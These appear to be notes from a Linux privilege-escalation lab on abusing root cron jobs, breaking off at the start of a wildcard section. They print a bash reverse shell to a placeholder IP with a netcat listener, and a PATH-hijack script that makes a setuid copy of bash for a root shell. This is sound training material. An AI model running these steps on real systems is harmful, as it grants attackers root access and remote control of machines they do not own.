## File Permissions
View the contents of the system-wide crontab:

```
user@debian:~$ cat /etc/crontab                                                             

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

Locate the full path of the overwrite.sh file:

`locate overwrite.sh`

Note that the file is world-writable:

`ls -l /usr/local/bin/overwrite.sh`

Reverse shell
```
#!/bin/bash
bash -i >& /dev/tcp/IP_ADDRESS/4444 0>&1
```

`nc -nvlp 4444`

## PATH Environment Variable
View the contents of the system-wide crontab, note that the PATH variable starts with /home/user which is our user's home directory.

>PATH=`/home/user`:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

Create a file called `overwrite.sh` in your home directory with the following contents:
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
Make sure that the file is executable:

`chmod +x /home/user/overwrite.sh`

Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash` command with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

## Wildcards
View the contents of the other cron job script:
```
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```